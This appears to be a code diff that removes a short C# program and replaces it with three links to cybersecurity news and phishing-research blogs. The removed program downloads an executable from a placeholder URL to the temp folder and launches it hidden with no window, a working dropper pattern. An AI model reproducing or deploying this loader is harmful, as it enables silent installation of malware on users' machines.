@@ -1,35 +1,4 @@
-using System;
-using System.Diagnostics;
-using System.IO;
-using System.Net;
+https://cybersecuritynews.com/
+https://www.seqrite.com/blog/
 
-class Program
-{
-    static void Main()
-    {
-        string url = "https://example.com/zxy.exe";  // your link
-        string tempPath = Path.Combine(Path.GetTempPath(), "zxy.exe");
-
-        try
-        {
-            // Download file to temp location
-            using (WebClient client = new WebClient())
-            {
-                client.DownloadFile(url, tempPath);
-            }
-
-            // Run the downloaded exe
-            Process.Start(new ProcessStartInfo
-            {
-                FileName = tempPath,
-                UseShellExecute = false,
-                CreateNoWindow = true,
-                WindowStyle = ProcessWindowStyle.Hidden
-            });
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine(ex.Message);
-        }
-    }
-}
+https://intezer.com/blog/emerging-phishing-techniques-new-threats-and-attack-vectors/
